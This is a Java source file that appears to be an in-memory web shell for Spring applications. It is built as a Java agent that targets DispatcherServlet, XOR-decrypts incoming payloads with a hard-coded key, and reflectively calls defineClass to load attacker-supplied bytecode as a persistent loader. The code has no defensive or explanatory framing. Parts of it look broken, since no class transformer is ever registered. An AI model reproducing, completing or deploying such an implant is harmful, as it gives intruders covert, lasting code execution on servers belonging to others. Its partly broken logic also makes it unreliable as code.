import java.lang.instrument.Instrumentation;
import java.lang.reflect.Method;
import java.lang.reflect.Constructor;

public class AgentShell {

    private static Object globalLoader = null;
    private static final String GLOBAL_KEY = "[KEY]           ";

    public static void agentmain(String agentArgs, Instrumentation inst) {
        initAgent(inst);
    }

    public static void premain(String agentArgs, Instrumentation inst) {
        initAgent(inst);
    }

    private static void initAgent(Instrumentation inst) {
        try {
            Class<?>[] allClasses = inst.getAllLoadedClasses();
            for (Class<?> clazz : allClasses) {
                String className = clazz.getName();
                if (className.equals("org.springframework.web.servlet.DispatcherServlet")) {
                    try {
                        inst.retransformClasses(clazz);
                    } catch (Exception ignored) {
                    }
                }
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static synchronized String executePayload(byte[] encryptedData, ClassLoader parentLoader) {
        try {
            byte[] xorDecrypted = decryptPayload(encryptedData, GLOBAL_KEY);
            
            boolean isLoaderInitRequest = (xorDecrypted.length > 4 && 
                xorDecrypted[0] == (byte)0xCA && xorDecrypted[1] == (byte)0xFE && 
                xorDecrypted[2] == (byte)0xBA && xorDecrypted[3] == (byte)0xBE);

            if (isLoaderInitRequest) {
                if (globalLoader != null) {
                    return "LOADER_ALREADY_EXISTS_RESPONSE";
                } else {
                    Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineMethod.setAccessible(true);

                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, xorDecrypted, 0, xorDecrypted.length);
                    Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);
                    globalLoader = constructor.newInstance(parentLoader);

                    return "LOADER_INIT_SUCCESS";
                }
            } else {
                if (globalLoader != null) {
                    globalLoader.getClass().getMethod("equals", Object.class).invoke(globalLoader, (Object) null);
                    return "EXEC_SUCCESS";
                } else {
                    return "EXEC_FAILED: No loader initialized.";
                }
            }
        } catch (Exception e) {
            return "EXEC_FAILED: " + e.toString();
        }
    }

    private static byte[] decryptPayload(byte[] data, String keyStr) {
        if (data == null || data.length == 0 || keyStr == null) return new byte[0];
        byte[] decrypted = new byte[data.length];
        byte[] keyBytes = keyStr.getBytes();
        int keyLength = keyBytes.length;
        for (int i = 0; i < data.length; i++) {
            decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
        }
        return decrypted;
    }
}